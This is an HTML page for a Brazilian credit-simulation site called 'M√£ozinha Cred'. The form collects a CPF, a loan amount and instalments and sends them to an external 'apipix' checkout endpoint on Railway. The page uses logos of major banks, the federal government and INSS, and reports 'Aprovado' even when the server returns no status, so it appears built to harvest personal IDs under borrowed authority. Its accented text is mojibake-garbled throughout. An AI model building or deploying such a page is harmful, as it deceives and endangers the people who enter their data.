<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>M√£ozinha Cred - Simula√ß√£o</title>
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css" />
</head>
<body>
  <!-- Carrossel de bancos -->
  <div class="bank-carousel">
    <div class="logos">
      <img src="./logos/itau-removebg-preview.png" alt="Ita√∫">
      <img src="./logos/banco-pan-removebg-preview.png" alt="Banco Pan">
      <img src="./logos/btg-pactual-removebg-preview.png" alt="BTG Pactual">
      <img src="./logos/banco-inter-removebg-preview.png" alt="Banco Inter">
      <img src="./logos/i605527.jpeg" alt="Caixa Econ√¥mica Federal">
      <img src="./logos/channels4_profile.jpg" alt="Banco do Brasil">
      <img src="./logos/logo_picpay-bank-banco-multiplo_LKZp6M.png" alt="PicPay Bank">
      <img src="./logos/nubank-logo-4-1.png" alt="Nubank">
      <img src="./logos/logo_santander-cartoes_jXMftH.png" alt="Santander">
      <img src="./logos/bradesco-anuncia-uma-modernizacao-de-sua-marca-1541452912545_v2_450x450.jpg" alt="Bradesco">
    </div>
  </div>

  <!-- Card principal -->
  <div class="card">
    <img src="logo-maozinha.png" alt="M√£ozinha Cred" class="logo">
    <h2>M√£ozinha Cred üñêÔ∏è</h2>
    <p>Mais que cr√©dito, uma m√£o amiga.</p>

    <form id="formSimulacao">
      <label for="cpf">CPF (somente n√∫meros)</label>
      <input type="text" id="cpf" placeholder="Digite seu CPF" required />

      <label for="valor">Valor desejado (R$)</label>
      <input type="number" id="valor" placeholder="Ex: 1000" required />

      <label for="parcelas">Parcelas</label>
      <input type="number" id="parcelas" placeholder="Ex: 12" required />

      <button type="submit">Simular</button>
    </form>

    <!-- Resultado da API -->
    <div id="resultadoSimulacao"></div>
  </div>

  <!-- Logos GOV e INSS -->
  <div class="gov-section">
    <img src="./logos/gov.png" alt="Governo Federal">
    <img src="./logos/inss.png" alt="INSS">
  </div>

  <script>
    async function enviarSimulacao(event) {
      event.preventDefault();

      const cpf = document.getElementById("cpf").value;
      const valor = document.getElementById("valor").value;
      const parcelas = document.getElementById("parcelas").value;
      const botao = document.querySelector("button[type='submit']");
      const resultado = document.getElementById("resultadoSimulacao");

      resultado.innerHTML = "";
      resultado.style.display = "none";

      // loader dentro do bot√£o
      botao.disabled = true;
      botao.innerHTML = `<span class="loader"></span> Consultando API...`;

      try {
        const response = await fetch("https://apipix-production-7695.up.railway.app/api/checkout", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ cpf, valor, parcelas })
        });

        if (!response.ok) throw new Error("Erro ao conectar √† API");
        const data = await response.json();

        resultado.style.display = "block";
        resultado.innerHTML = `
          <div class="card-resultado sucesso">
            <h3>‚úÖ Simula√ß√£o enviada com sucesso!</h3>
            <p><strong>CPF:</strong> ${cpf}</p>
            <p><strong>Valor:</strong> R$ ${Number(valor).toLocaleString("pt-BR")}</p>
            <p><strong>Parcelas:</strong> ${parcelas}x</p>
            <p><strong>Status:</strong> ${data.status || "Aprovado"}</p>
            <p><small>ID da opera√ß√£o: ${data.id || "N/A"}</small></p>
          </div>
        `;
      } catch (error) {
        resultado.style.display = "block";
        resultado.innerHTML = `
          <div class="card-resultado erro">
            <h3>‚ùå Falha na conex√£o com a API</h3>
            <p>Verifique se o servidor est√° ativo no Railway.</p>
          </div>
        `;
      } finally {
        botao.disabled = false;
        botao.innerHTML = "Simular novamente";
      }
    }

    document.querySelector("form").addEventListener("submit", enviarSimulacao);
  </script>
</body>
</html>
